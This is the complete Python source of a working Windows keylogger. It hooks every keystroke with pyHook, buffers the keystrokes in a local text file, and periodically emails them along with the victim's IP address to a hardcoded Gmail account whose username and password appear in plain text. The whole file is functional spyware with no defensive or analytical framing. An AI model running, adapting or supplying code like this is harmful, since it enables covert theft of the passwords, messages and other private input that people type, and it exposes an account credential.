from __future__ import print_function
from utility.network_utility import get_own_ip, internet_on
from notification.email_service import EmailService
from notification.email_service import Message
import pyHook, pythoncom, sys
import datetime
import sys
import time
import urllib2
import json
from multiprocessing import Process, Pipe

file_log = r'C:\keylogging\keylog.txt'
f = open(file_log, 'r+')
f.seek(0)
f.truncate()
last_sent = datetime.datetime.now()

#proc 1
def on_keyboard_event(event):
    global_pipe.send(chr(event.Ascii))
    print(chr(event.Ascii), end="")

    return True

#proc 2
def get_permission_to_send():
    current_time = datetime.datetime.now()
    delta = current_time - last_sent

    buffer_size = f.tell()

    print('f.tell():', buffer_size)
    print('DELTA:', delta.seconds)
    if delta.seconds > 300 or buffer_size > 400:
        return True

#proc 2
def send_email(body):
    username = "n1gh7dev@gmail.com"
    password = "testdev123"
    message = Message("n1gh7dev@gmail.com", "n1gh7dev@gmail.com", "logging", body)
    sender = EmailService()
    sender.send(message, username, password)


#proc 1
def init_logging(pipe):
    global global_pipe
    global_pipe = pipe
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = on_keyboard_event
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


if internet_on():
    try:
        send_email(get_own_ip())
    except:
        pass


if __name__ == '__main__':
    sender_proc, receiver_proc = Pipe()
    p = Process(target=init_logging, args=(sender_proc, ))
    p.start()

    while True:
        time.sleep(0.2)
        if receiver_proc.poll():
            character = receiver_proc.recv()
            f.write(character)
            print('received char:', character)

        if get_permission_to_send() and internet_on():
            ip = get_own_ip()
            f.seek(0)
            keystrokes = f.read()
            send_email(ip + '\n' + keystrokes)
            last_sent = datetime.datetime.now()
            f.seek(0)
            f.truncate()






